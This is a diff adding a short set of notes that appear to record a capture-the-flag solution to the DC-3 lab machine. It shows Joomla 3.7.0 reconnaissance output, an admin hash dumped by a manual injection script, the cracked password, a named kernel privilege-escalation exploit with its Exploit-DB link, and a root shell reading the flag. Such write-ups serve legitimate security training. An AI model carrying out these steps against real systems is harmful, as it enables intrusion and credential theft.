@@ -1,0 +1,42 @@
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://192.168.0.136/administrator/components
+http://192.168.0.136/administrator/modules
+http://192.168.0.136/administrator/templates
+http://192.168.0.136/images/banners
+
+[+] admin finder
+[++] Admin page : http://192.168.0.136/administrator/
+*****************************************************************
+
+use Manual_exploits/joom.py to get admin cred 
+Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
+
+admin - snoopy
+
+**************************************************************
+
+working Exploit ebpf_mapfd_doubleput_exploit 
+link: https://www.exploit-db.com/exploits/39772 
+root@DC-3:/root# cat t*
+cat t*
+ __        __   _ _   ____                   _ _ _ _ 
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+                                                     
+
+Congratulations are in order.  :-)
+
+I hope you've enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!!
